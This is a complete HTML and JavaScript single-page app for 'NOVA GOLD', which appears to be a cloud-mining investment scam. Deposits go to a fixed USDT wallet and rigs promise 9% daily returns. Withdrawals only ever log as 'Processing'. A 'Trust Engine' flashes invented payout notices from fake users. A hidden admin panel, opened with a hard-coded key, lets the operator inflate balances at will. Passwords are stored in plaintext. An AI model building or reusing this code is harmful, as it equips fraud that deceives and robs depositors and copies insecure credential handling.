<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA GOLD | Next-Gen Cloud Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0f172a; --glass: rgba(255, 255, 255, 0.03); }
        body { background: #f8fafc; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; touch-action: manipulation; }
        .nova-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05); transition: 0.3s; }
        .dark-card { background: var(--dark); color: white; border-radius: 24px; position: relative; overflow: hidden; }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 14px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
        .btn-gold:active { transform: scale(0.95); }
        .screen { display: none; animation: slideIn 0.4s ease-out; padding-bottom: 120px; }
        .active-screen { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 12px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
        .nav-item.active { color: var(--gold); }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 16px; border-radius: 14px; outline: none; margin-bottom: 12px; font-weight: 600; }
        .p-input:focus { border-color: var(--gold); background: white; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 2000; padding: 25px; overflow-y: auto; }
        #trust-toast { position: fixed; bottom: 95px; left: 15px; right: 15px; background: var(--dark); color: white; padding: 15px; border-radius: 18px; display: none; z-index: 3000; border-left: 6px solid var(--gold); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
    </style>
</head>
<body>

    <div id="trust-toast">
        <div class="flex items-center gap-4">
            <div class="w-10 h-10 bg-green-500/20 rounded-full flex items-center justify-center"><i class="fa-solid fa-check text-green-500 text-lg"></i></div>
            <div><p id="toast-user" class="font-black text-[10px] uppercase text-white"></p><p id="toast-msg" class="text-slate-400 text-[9px]"></p></div>
        </div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-12 text-center">
            <h1 id="logo-tap" class="text-6xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[6px] mt-3">Quantum Mining Infrastructure</p>
        </div>
        <div class="space-y-3">
            <input type="text" id="u-id" placeholder="Access Identifier" class="p-input">
            <input type="password" id="u-pw" placeholder="Security Passkey" class="p-input">
            <div id="admin-secret-box" class="hidden"><input type="password" id="adm-key" placeholder="System Master Access" class="p-input border-yellow-500 shadow-inner"></div>
            <button onclick="handleAuth()" class="w-full btn-gold py-5 shadow-xl shadow-yellow-600/20">Initialize Session</button>
            <p onclick="toggleMode()" id="mode-text" class="text-center text-[11px] mt-10 text-slate-500 font-bold uppercase cursor-pointer tracking-wider">Create New Deployment (Register)</p>
        </div>
    </div>

    <div id="app-shell" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white sticky top-0 z-[500] border-b">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <span id="user-tag" class="text-[9px] font-black bg-slate-900 text-white px-4 py-1.5 rounded-full tracking-widest uppercase">@Partner</span>
                <i onclick="logout()" class="fa-solid fa-power-off text-slate-300 text-xl"></i>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="dark-card p-8 mb-6 shadow-2xl border-b-8 border-[#D4AF37]">
                <div class="absolute top-0 right-0 p-4"><span class="flex h-3 w-3"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span></span></div>
                <div class="relative z-10 text-center">
                    <p class="text-[10px] text-slate-400 font-black uppercase tracking-[5px] mb-3">Institutional Liquidity</p>
                    <h1 id="bal-main" class="text-6xl font-black tracking-tighter mb-10">$0.00</h1>
                    <div class="grid grid-cols-2 gap-6 border-t border-white/10 pt-6">
                        <div class="text-left"><p class="text-[9px] text-slate-500 font-bold uppercase mb-1 tracking-widest">24h Yield</p><p id="bal-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[9px] text-slate-500 font-bold uppercase mb-1 tracking-widest">Total Earned</p><p id="bal-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <div onclick="openModal('modal-dep')" class="nova-card p-6 flex flex-col items-center gap-3 active:bg-slate-50 cursor-pointer">
                    <i class="fa-solid fa-circle-plus text-3xl text-[#D4AF37]"></i><span class="text-[10px] font-black uppercase">Add Funds</span>
                </div>
                <div onclick="openModal('modal-wd')" class="nova-card p-6 flex flex-col items-center gap-3 active:bg-slate-50 cursor-pointer">
                    <i class="fa-solid fa-money-bill-transfer text-3xl text-slate-400"></i><span class="text-[10px] font-black uppercase">Extract</span>
                </div>
            </div>

            <div class="nova-card p-6 mb-4">
                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Legal Framework</h3>
                <div class="space-y-3">
                    <div class="flex justify-between items-center p-4 bg-slate-50 rounded-2xl border border-slate-100">
                        <div class="flex items-center gap-4"><i class="fa-solid fa-file-contract text-slate-400"></i><span class="text-xs font-bold">Whitepaper v4.1</span></div>
                        <i class="fa-solid fa-chevron-right text-[10px] text-slate-300"></i>
                    </div>
                    <div class="flex justify-between items-center p-4 bg-slate-50 rounded-2xl border border-slate-100">
                        <div class="flex items-center gap-4"><i class="fa-solid fa-shield-halved text-slate-400"></i><span class="text-xs font-bold">Privacy Policy</span></div>
                        <i class="fa-solid fa-chevron-right text-[10px] text-slate-300"></i>
                    </div>
                </div>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Rigs</span></h2>
            <div id="nodes-list" class="space-y-4">
                </div>
        </div>

        <div id="page-history" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Audit <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="logs-list" class="space-y-3">
                <p class="text-center text-slate-400 text-xs py-10">No recent transactions detected.</p>
            </div>
        </div>

        <nav class="nav-bar">
            <div onclick="switchPage('page-dash', this)" class="nav-item active"><i class="fa-solid fa-house-chimney text-xl"></i><span>HOME</span></div>
            <div onclick="switchPage('page-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-xl"></i><span>NODES</span></div>
            <div onclick="switchPage('page-history', this)" class="nav-item"><i class="fa-solid fa-list-ul text-xl"></i><span>LOGS</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">INBOUND FUNDS</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-circle-xmark text-slate-300 text-2xl"></i></div>
        <p class="text-[10px] font-bold text-slate-400 uppercase mb-4 tracking-widest text-center">Transfer USDT (TRC20)</p>
        <div class="nova-card p-6 bg-slate-900 text-white mb-8 text-center"><p class="text-[11px] font-mono font-black text-[#D4AF37] break-all">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</p></div>
        <input type="number" id="in-amt" placeholder="Amount (USDT)" class="p-input">
        <input type="text" id="in-hash" placeholder="Transaction ID / Hash" class="p-input">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-5 shadow-lg">Confirm Deposit</button>
    </div>

    <div id="modal-wd" class="modal">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">EXTRACT</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-circle-xmark text-slate-300 text-2xl"></i></div>
        <input type="number" id="out-amt" placeholder="Withdrawal Amount" class="p-input">
        <input type="text" id="out-addr" placeholder="Recipient Wallet Address" class="p-input">
        <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-5 bg-slate-900">Process Payout</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-slate-50 z-[5000] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h1 class="text-3xl font-black">MASTER ADMIN</h1><button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl font-bold">EXIT</button></div>
        <div class="nova-card p-6 mb-6">
            <h4 class="text-xs font-black uppercase mb-4 text-slate-400">Balance Manipulation</h4>
            <input type="text" id="adm-target" placeholder="User Identifier" class="p-input">
            <input type="number" id="adm-value" placeholder="Amount to Inject" class="p-input">
            <button onclick="injectFunds()" class="w-full btn-gold py-4 bg-slate-900">Direct Injection</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const fb = initializeApp(config); const db = getFirestore(fb);
        let user = localStorage.getItem('nova_session'); let isLogin = true;

        if(user) bootApp(user);

        // --- AUTH LOGIC ---
        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            const aK = document.getElementById('adm-key').value;
            if(!id || !pw) return alert("All credentials required");
            if(aK === "NOVA786") { openAdmin(); return; }

            const uR = doc(db, "users", id); const s = await getDoc(uR);
            if(!isLogin) {
                if(s.exists()) return alert("Identifier occupied");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0 });
                localStorage.setItem('nova_session', id); bootApp(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_session', id); bootApp(id);
            } else alert("Access Denied");
        };

        function bootApp(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app-shell').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
            
            // Live Balance Update
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                if(data) {
                    document.getElementById('bal-main').innerText = "$" + (data.balance || 0).toFixed(2);
                    document.getElementById('bal-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                    document.getElementById('bal-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                }
            });
            genNodes(); loadLogs(); setInterval(showToast, 18000);
        }

        // --- UI NAVIGATION ---
        window.switchPage = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };

        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';

        // --- CORE FEATURES ---
        function genNodes() {
            const c = document.getElementById('nodes-list'); c.innerHTML = "";
            const imgs = ["https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=400&auto=format", "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400&auto=format"];
            for(let i=1; i<=30; i++) {
                const cost = i * 50; const yield_val = (cost * 0.09).toFixed(2);
                c.innerHTML += `
                <div class="nova-card overflow-hidden">
                    <img src="${imgs[i%2]}" class="w-full h-32 object-cover grayscale-[40%]">
                    <div class="p-5 flex justify-between items-center">
                        <div><h4 class="font-black text-xs uppercase tracking-tighter">Rig Gen-${i} Ultra</h4><p class="text-green-500 font-bold text-[10px]">+$${yield_val}/24H Output</p></div>
                        <button onclick="buyNode(${cost}, ${yield_val})" class="btn-gold px-6 py-2 shadow-md">$${cost}</button>
                    </div>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Liquidity Low");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Rig Deployment Successful!");
        };

        window.submitFin = async (type) => {
            const a = parseFloat(document.getElementById(type=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(type=='Deposit'?'in-hash':'out-addr').value;
            if(!a || !r) return alert("Details missing");
            await addDoc(collection(db, "logs"), { user, type, amount: a, status: 'Processing', time: Date.now(), ref: r });
            alert("Request broadcasted to network!"); closeModal(type=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadLogs() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", user)), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                let logs = []; s.forEach(d => logs.push(d.data()));
                logs.sort((a,b) => b.time - a.time);
                logs.forEach(l => {
                    c.innerHTML += `<div class="nova-card p-4 flex justify-between items-center bg-white">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase tracking-widest">${l.type}</p><p class="text-xs font-bold">$${l.amount.toFixed(2)}</p></div>
                        <span class="text-[9px] font-black uppercase px-3 py-1 rounded-full ${l.status=='Success'?'bg-green-50 text-green-500 border border-green-100':'bg-yellow-50 text-yellow-600 border border-yellow-100'}">${l.status}</span>
                    </div>`;
                });
            });
        }

        // --- TRUST ENGINE ---
        function showToast() {
            const users = ["Malik", "Sara", "Zain", "Fatima", "Arshad", "Umer", "Khan", "Irfan"];
            const u = users[Math.floor(Math.random()*users.length)];
            const val = (Math.random()*450 + 20).toFixed(2);
            document.getElementById('toast-user').innerText = `Partner @${u}***`;
            document.getElementById('toast-msg').innerText = `Successfully extracted $${val} USDT`;
            const t = document.getElementById('trust-toast'); t.style.display='block';
            setTimeout(()=> t.style.display='none', 4500);
        }

        // --- ADMIN SECRETS ---
        let taps = 0;
        document.getElementById('logo-tap').onclick = () => {
            taps++; if(taps >= 6) document.getElementById('admin-secret-box').classList.remove('hidden');
        };
        window.openAdmin = () => document.getElementById('admin-panel').classList.remove('hidden');
        window.closeAdmin = () => { document.getElementById('admin-panel').classList.add('hidden'); taps=0; document.getElementById('admin-secret-box').classList.add('hidden'); };
        window.injectFunds = async () => {
            const target = document.getElementById('adm-target').value.toLowerCase().trim();
            const val = parseFloat(document.getElementById('adm-value').value);
            const uR = doc(db, "users", target); const s = await getDoc(uR);
            if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + val }); alert("Liquidity Injected!"); }
        };

        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "Create New Deployment (Register)" : "Existing Partner (Login)"; };
        window.logout = () => { localStorage.removeItem('nova_session'); location.reload(); };
    </script>
</body>
</html>
